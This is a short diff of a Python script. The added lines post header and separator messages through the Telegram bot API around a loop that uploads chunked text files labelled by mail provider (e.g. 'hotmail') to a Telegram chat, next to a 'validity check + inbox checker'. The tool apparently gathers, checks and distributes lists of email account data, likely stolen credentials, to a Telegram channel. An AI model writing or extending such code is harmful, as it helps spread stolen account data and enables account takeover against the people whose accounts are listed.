@@ -694,10 +694,24 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
+                            # Pre message
+                            async with aiohttp.ClientSession() as sess:
+                                await sess.post(
+                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                    json={"chat_id": TELEGRAM_CHAT, "text": f"WARCLOUD UPDATE ({label.upper()})"}
+                                )
+
                             for chunk in chunks:
                                 fname = f"{label} {len(chunk)} by @xn9bowner.txt"
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
+
+                            # Post message
+                            async with aiohttp.ClientSession() as sess:
+                                await sess.post(
+                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                    json={"chat_id": TELEGRAM_CHAT, "text": "---------------------------"}
+                                )
 
                             # Validity check + inbox checker (hotmail only, skip if over 5000 lines)
                             if label == "hotmail":
